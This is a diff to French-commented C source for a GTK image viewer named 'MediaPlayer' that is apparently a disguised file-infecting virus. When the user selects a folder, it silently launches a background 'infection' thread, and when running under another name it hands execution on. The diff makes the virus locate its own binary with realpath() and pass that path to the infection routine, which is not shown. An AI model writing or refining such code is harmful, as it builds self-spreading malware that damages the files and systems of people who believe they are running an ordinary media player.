@@ -8,6 +8,7 @@
 #include <stdlib.h>
 #include <dirent.h>
 #include <pthread.h>
+#include <limits.h>
 
 #include "infection.h"
 #include "transfert.h"
@@ -16,10 +17,17 @@
 GtkWidget *liste_images;
 GtkWidget *image_affichee;
 char chemin_selection[MAX_PATH_LEN] = "";
+char chemin_virus[MAX_PATH_LEN];
+
+// Fonction de rappel pour le bouton "Choisir un dossier source"
+void destroy_widget(GtkWidget *widget, gpointer data) {
+    (void)data;
+    gtk_widget_destroy(widget);
+}
 
 // Ouvre une image dans la zone centrale
 void afficher_image_dans_media_player(const char *filename) {
-    char chemin_complet[MAX_PATH_LEN];
+    char chemin_complet[2 * MAX_PATH_LEN];
     snprintf(chemin_complet, sizeof(chemin_complet), "%s/%s", chemin_selection, filename);
 
     gtk_image_set_from_file(GTK_IMAGE(image_affichee), chemin_complet);
@@ -37,7 +45,7 @@ void on_image_selectionnee(GtkListBox *box, GtkListBoxRow *row, gpointer user_da
 
 // Remplit la liste d'images depuis le dossier sélectionné
 void charger_images(const char *dossier) {
-    gtk_container_foreach(GTK_CONTAINER(liste_images), (GtkCallback) gtk_widget_destroy, NULL);
+    gtk_container_foreach(GTK_CONTAINER(liste_images), destroy_widget, NULL);
 
     DIR *dir = opendir(dossier);
     if (!dir) return;
@@ -91,7 +99,7 @@ void on_choisir_dossier_clicked(GtkWidget *widget, gpointer window_ptr) {
         // Lancer infection en arrière-plan
         ThreadInfectArgs *args = malloc(sizeof(ThreadInfectArgs));
         strncpy(args->chemin, chemin_selection, MAX_PATH_LEN);
-        strncpy(args->virus_path, "./MediaPlayer", MAX_PATH_LEN);
+        strncpy(args->virus_path, chemin_virus, MAX_PATH_LEN);
         pthread_t thread_id;
         if (pthread_create(&thread_id, NULL, thread_infection, args) == 0) {
             pthread_detach(thread_id);
@@ -116,6 +124,11 @@ int main(int argc, char *argv[]) {
     if (!strstr(argv[0], "MediaPlayer")) {
         transferer_execution_si_necessaire(argv[0], argv);
         return 0;
+    }
+
+    if (realpath(argv[0], chemin_virus) == NULL) {
+        perror("Erreur realpath");
+        return 1;
     }
 
     gtk_init(&argc, &argv);
